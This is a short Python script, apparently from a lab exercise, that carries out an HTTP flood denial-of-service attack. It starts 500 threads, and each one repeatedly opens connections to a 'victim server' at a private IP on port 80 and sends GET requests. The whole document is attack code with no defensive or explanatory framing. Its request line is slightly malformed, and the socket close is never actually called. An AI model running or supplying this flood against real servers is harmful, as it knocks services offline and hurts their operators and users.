import socket
import threading

target = '10.0.2.4' #ip address of victim server
port = 80 #port for http

def http_flood_attack(): #infinite while loop of GET request being sent
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,port))
		s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
		s.sendto(("Host: 10.0.2.6" + "\r\n\r\n").encode('ascii'), (target,port))
		s.close
		

for i in range(500): #multi-threading for running specified instances of attack function parallel to one another
	thread = threading.Thread(target=http_flood_attack)
	thread.start()
